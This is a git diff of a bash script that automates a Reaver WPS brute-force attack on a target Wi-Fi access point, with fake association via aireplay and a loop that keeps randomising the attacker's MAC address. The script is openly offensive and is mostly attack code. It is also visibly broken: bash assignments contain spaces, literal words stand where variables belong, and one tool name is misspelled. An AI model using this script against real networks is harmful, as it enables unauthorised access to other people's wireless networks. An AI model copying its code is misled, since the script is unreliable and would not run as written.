@@ -14,7 +14,7 @@ channel = $4
 moniterName = $5
 
 reaver-prep () {
-	
+
 
 	echo "[+] Killing other processes"
 
@@ -28,7 +28,7 @@ reaver-prep () {
 }
 
 reaver-assoc () {
-	
+
 	local inter = $1
 	local b = $2
 	local e = $3
@@ -37,7 +37,7 @@ reaver-assoc () {
 
 	#Sets channel (can be found in airodump-ng)
 	sudo iw dev monName set channel c
-	
+
 	#Starts the association with target ap
 	sudo airplay-ng inter -1 120 -a b -e e
 
@@ -47,7 +47,10 @@ echo "[++] Prepping for reaverAttack"
 reaver-prep interface
 
 echo "[++] Associating with AP (seperate from Reaver's)"
-reaver-assoc > /dev/null &
+reaver-assoc interface bssid essid moniterName channel > /dev/null &
 
 echo "[++] Starting Reaver attack"
-sudo reaver -i $1 -A -b $2 -vv --no-nacks -a 
+sudo reaver -i moniterName -A -b bssid -vv --no-nacks -a
+while [[ True ]]; do
+		sudo macchanger -r moniterName
+done
